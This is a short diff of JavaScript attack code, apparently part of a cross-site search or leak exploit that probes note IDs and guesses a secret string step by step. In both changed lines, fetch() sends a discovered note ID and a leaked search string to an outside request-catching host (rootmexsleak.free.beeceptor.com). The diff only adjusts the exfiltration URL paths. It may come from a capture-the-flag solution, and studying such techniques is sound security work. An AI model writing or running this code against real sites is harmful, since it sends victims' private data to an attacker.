@@ -73,7 +73,7 @@
                         loadNextNote(currentIndex);
                     } else if (valid >= 4) {
                         foundId = currentIndex;
-                        fetch("https://rootmexsleak.free.beeceptor.com/" + foundId);
+                        fetch("https://rootmexsleak.free.beeceptor.com/id/" + foundId);
                         startSearch(foundId, "");
                     } else {
                         loadNextNote(currentIndex + 1);
@@ -106,7 +106,7 @@
 
                         if (hit) {
                             hit = false;
-                            fetch("https://rootmexsleak.free.beeceptor.com/" + searchStr);
+                            fetch("https://rootmexsleak.free.beeceptor.com/res/" + searchStr);
                         }
 
                         nextQuery = getNextQuery(searchStr);
